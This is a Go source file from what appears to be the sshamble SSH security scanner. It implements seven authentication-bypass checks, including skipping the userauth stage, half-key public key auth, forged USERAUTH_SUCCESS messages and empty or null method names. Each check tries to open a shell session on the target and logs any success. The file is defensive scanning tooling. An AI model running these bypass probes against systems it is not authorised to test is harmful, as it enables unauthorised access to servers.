package cmd

import (
	"net"
	"strings"

	"github.com/runZeroInc/sshamble/auth"
	"github.com/runZeroInc/sshamble/crypto/ssh"
)

func bypassAtInterestingStage(tname string, addr string, conf *ScanConfig, res *auth.AuthResult) bool {
	switch res.Stage {
	case "init", "connect", "kex":
		conf.Logger.Errorf("%s %s kex: %v", addr, tname, res.Error)
	case "open-session":
		if !strings.Contains(res.Error, "ssh: unexpected packet in response to channel") {
			conf.Logger.Debugf("%s %s failed to open session without ssh-userauth: %v", tname, addr, res.Error)
		}
	case "auth":
		conf.Logger.Debugf("%s %s failed to open session after auth stage: %v", tname, addr, res.Error)
	default:
		return true
	}
	return false
}

const checkSkipSSHUserAuth = "skip-ssh-userauth"

func sshCheckSkipUserAuthService(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipSSHUserAuth
	if !conf.IsCheckEnabled(tname) {
		return nil
	}
	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)
	res := auth.SSHAuth(addr, options.WithSkipStages("ssh-userauth", "auth"), nil)
	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session without ssh-userauth '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

const checkSkipAuth = "skip-auth"

func sshCheckSkipAuth(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipAuth
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	res := auth.SSHAuth(addr, options.WithSkipStages("auth"), nil)
	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session without auth '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

const checkSkipAuthNone = "skip-auth-none"

func sshCheckSkipAuthNone(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipAuthNone
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	res := auth.SSHAuth(addr, options.WithIgnoreAuthError(), auth.SSHAuthHandlerSingle(ssh.None()))
	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session after a failed 'none' auth '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

const checkSkipAuthPubkeyAny = "skip-auth-pubkeyany"

func sshCheckSkipAuthPubkeyAny(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipAuthPubkeyAny
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	// Any full key is accepted, exit early
	if root.PubKeyAnyFullKey != nil {
		return nil
	}

	// Prefer a previously accepted half-key
	signer := root.PubKeyAnyHalfKey

	// Otherwise pick our RSA 2048 test key instead
	if signer == nil {
		signer = auth.HalfSignerFromPubkey(conf.TestKeyRSA2048.PublicKey())
	}

	res := auth.SSHAuth(addr, options.WithIgnoreAuthError(), auth.SSHAuthHandlerSingle(ssh.AuthMethod(
		ssh.PublicKeysCallback(func() ([]ssh.Signer, error) {
			return []ssh.Signer{signer}, nil
		}))))

	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session after a half-auth '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.SessionSecret = auth.PubKeyToString(signer.PublicKey())
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

const checkSkipAuthSuccess = "skip-auth-success"

func sshCheckSkipAuthSuccess(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipAuthSuccess
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	options = options.WithIgnoreAuthError().WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, res *auth.AuthResult) error {
		return uac.WriteMsgUserAuthSuccess()
	})

	res := auth.SSHAuth(addr, options, auth.SSHAuthHandlerSingle(ssh.None()))
	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session after sending a SSH_MSG_USERAUTH_SUCCESS '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

const checkSkipAuthMethodEmpty = "skip-auth-method-empty"

func sshCheckSkipAuthMethodEmpty(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipAuthMethodEmpty
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	customAuth := ssh.CustomAuth(
		options.Username,
		ssh.ServiceSSH,
		"",
		nil,
	)

	res := auth.SSHAuth(addr, options.WithIgnoreAuthError(), auth.SSHAuthHandlerSingle(customAuth))
	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session with empty auth method '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

const checkSkipAuthMethodNull = "skip-auth-method-null"

func sshCheckSkipAuthMethodNull(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkSkipAuthMethodNull
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	customAuth := ssh.CustomAuth(
		options.Username,
		ssh.ServiceSSH,
		"\x00",
		nil,
	)

	res := auth.SSHAuth(addr, options.WithIgnoreAuthError(), auth.SSHAuthHandlerSingle(customAuth))
	if bypassAtInterestingStage(tname, addr, conf, res) {
		conf.Logger.Warnf("%s %s provided a session with empty auth method '%s': %s", addr, tname, res.Stage, res.SessionOutput)
		res.SessionMethod = tname
		root.SessionMethod = tname
		root.SessionOutput = res.SessionOutput
		root.ExitStatus = res.ExitStatus
		return res
	}
	return nil
}

func initBypassChecks() {
	registerCheck(checkSkipSSHUserAuth, "bypass", false, true)
	registerCheck(checkSkipAuth, "bypass", false, true)
	registerCheck(checkSkipAuthNone, "bypass", false, true)
	registerCheck(checkSkipAuthPubkeyAny, "bypass", false, true)
	registerCheck(checkSkipAuthSuccess, "bypass", false, true)
	registerCheck(checkSkipAuthMethodEmpty, "bypass", false, true)
	registerCheck(checkSkipAuthMethodNull, "bypass", false, true)
}
